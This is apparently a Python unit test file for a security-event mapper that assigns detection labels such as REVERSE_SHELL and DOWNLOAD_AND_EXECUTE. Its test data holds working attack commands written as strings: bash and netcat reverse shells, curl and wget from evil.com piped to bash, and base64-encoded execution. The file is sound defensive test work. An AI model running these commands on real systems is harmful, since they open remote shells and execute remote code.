# tests/test_atlas_mapper_exhaustive.py
import unittest
import sys
import os

sys.path.append(os.getcwd())

from analyzer.graph_analyzer.atlas_mapper import AtlasMapper

class TestAtlasMapperExhaustive(unittest.TestCase):
    def setUp(self):
        self.mapper = AtlasMapper()
        print(f"\n[{self._testMethodName}] 测试开始...")

    # ==========================================
    # 1. 复杂命令行特征 (覆盖所有 Regex 变体)
    # ==========================================
    def test_cmdline_variations(self):
        """测试命令行正则的各种变体"""
        variations = [
            # 反弹 Shell 变体
            ("Bash TCP", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "REVERSE_SHELL"),
            ("Netcat -e", "nc -e /bin/sh 10.0.0.1 1234", "REVERSE_SHELL"),
            ("Ncat -e", "ncat -e /bin/bash 10.0.0.1 1234", "REVERSE_SHELL"),
            
            # 下载执行变体 (之前的修复验证)
            ("Curl Pipe Bash", "curl http://evil.com/s.sh | bash", "DOWNLOAD_AND_EXECUTE"),
            ("Wget Pipe Bash", "wget -qO- http://evil.com/s.sh | bash", "DOWNLOAD_AND_EXECUTE"),
            
            # 下载到临时目录
            ("Curl to Tmp", "curl http://evil.com -o /tmp/m", "DOWNLOAD_TO_TEMP"),
            ("Wget to Tmp", "wget http://evil.com -O /tmp/m", "DOWNLOAD_TO_TEMP"),
            
            # 编码执行
            ("Base64 Decode", "echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh", "ENCODED_EXECUTION"),
        ]
        
        for name, cmd, expected in variations:
            event = {
                "event": {"category": "process"},
                "process": {"command_line": cmd}
            }
            label = self.mapper.get_label(event)
            print(f"   Testing {name}: {cmd[:30]}... -> {label}")
            self.assertEqual(label, expected, f"[{name}] 映射失败")

    # ==========================================
    # 2. WebShell 动作逻辑深度测试 (逻辑分支)
    # ==========================================
    def test_webshell_logic_branch(self):
        """测试 WebShell 判定的动作过滤逻辑"""
        path = "/var/www/html/shell.php"
        
        # 场景 A: 写入/创建 (高危) -> PHP_SCRIPT
        high_risk_actions = ["create", "write", "moved-to", "rename"]
        for action in high_risk_actions:
            event = {
                "event": {"category": "file", "action": action},
                "file": {"path": path, "extension": "php"}
            }
            label = self.mapper.get_label(event)
            self.assertEqual(label, "PHP_SCRIPT", f"动作 {action} 应被标记为 PHP_SCRIPT")

        # 场景 B: 读取/打开 (中危) -> WEB_ROOT_ACCESS
        # 逻辑：它在 Web 目录，但不符合高危动作列表，应落入正则匹配
        low_risk_actions = ["read", "open", "access"]
        for action in low_risk_actions:
            event = {
                "event": {"category": "file", "action": action},
                "file": {"path": path, "extension": "php"}
            }
            label = self.mapper.get_label(event)
            print(f"   Testing WebShell Action '{action}' -> {label}")
            self.assertEqual(label, "WEB_ROOT_ACCESS", f"动作 {action} 不应标记为 PHP_SCRIPT")

    # ==========================================
    # 3. 网络方向自动推断 (Inference Logic)
    # ==========================================
    def test_network_direction_inference(self):
        """测试缺失 direction 字段时的推断逻辑"""
        
        # 场景 1: Curl 发起连接 -> 推断为 Outbound
        evt_curl = {
            "event": {"category": "network"},
            "process": {"name": "curl"}, # 注意：这里用 process.name
            "network": {"protocol": "http"} # 无 direction
        }
        label = self.mapper.get_label(evt_curl)
        print(f"   Testing Inference (curl) -> {label}")
        self.assertIn("NETWORK_Outbound", self.mapper.get_all_labels(evt_curl))

        # 场景 2: Nginx 接收连接 -> 推断为 Inbound
        evt_nginx = {
            "event": {"category": "network"},
            "process": {"name": "nginx"},
            "network": {"protocol": "http"} # 无 direction
        }
        label = self.mapper.get_label(evt_nginx)
        print(f"   Testing Inference (nginx) -> {label}")
        self.assertIn("NETWORK_Inbound", self.mapper.get_all_labels(evt_nginx))

    # ==========================================
    # 4. 字段缺失与回退逻辑 (Fallback)
    # ==========================================
    def test_field_fallback(self):
        """测试 process.executable 缺失时是否使用 process.name"""
        # 场景：Syslog 有时只记录 process.name 而没有完整路径
        event = {
            "event": {"category": "process"},
            "process": {
                "executable": "", # 空
                "name": "nmap"    # 有值
            }
        }
        label = self.mapper.get_label(event)
        print(f"   Testing Process Name Fallback (nmap) -> {label}")
        self.assertEqual(label, "NETWORK_SCANNER")

    def test_global_fallback(self):
        """测试完全无匹配时的兜底标签"""
        # 场景：一个完全正常的进程
        event = {
            "event": {"category": "process", "action": "start"},
            "process": {
                "executable": "/usr/bin/notepad",
                "name": "notepad"
            }
        }
        label = self.mapper.get_label(event)
        print(f"   Testing Global Fallback -> {label}")
        # 预期：PROCESS_START (Category_Action)
        self.assertEqual(label, "PROCESS_START")

    # ==========================================
    # 5. 特殊路径规则覆盖
    # ==========================================
    def test_special_paths(self):
        """测试 Cowrie 下载目录等特殊路径"""
        # Cowrie 蜜罐下载
        event_cowrie = {
            "event": {"category": "file"},
            "file": {"path": "/srv/cowrie/var/lib/cowrie/downloads/malware.exe"}
        }
        label = self.mapper.get_label(event_cowrie)
        print(f"   Testing Cowrie Download -> {label}")
        self.assertEqual(label, "COWRIE_DOWNLOAD")

        # 共享内存 (无文件攻击常驻地)
        event_shm = {
            "event": {"category": "file"},
            "file": {"path": "/dev/shm/payload"}
        }
        label = self.mapper.get_label(event_shm)
        print(f"   Testing /dev/shm -> {label}")
        self.assertEqual(label, "TEMP_FILE_ACCESS")

    # ==========================================
    # 6. SSH 与 敏感文件区分 (验证之前的修复)
    # ==========================================
    def test_ssh_vs_sensitive(self):
        """验证 .ssh 目录是否正确归类为 SSH_RELATED"""
        event = {
            "event": {"category": "file"},
            "file": {"path": "/root/.ssh/authorized_keys"}
        }
        label = self.mapper.get_label(event)
        print(f"   Testing .ssh path -> {label}")
        self.assertEqual(label, "SSH_RELATED")

if __name__ == '__main__':
    unittest.main()
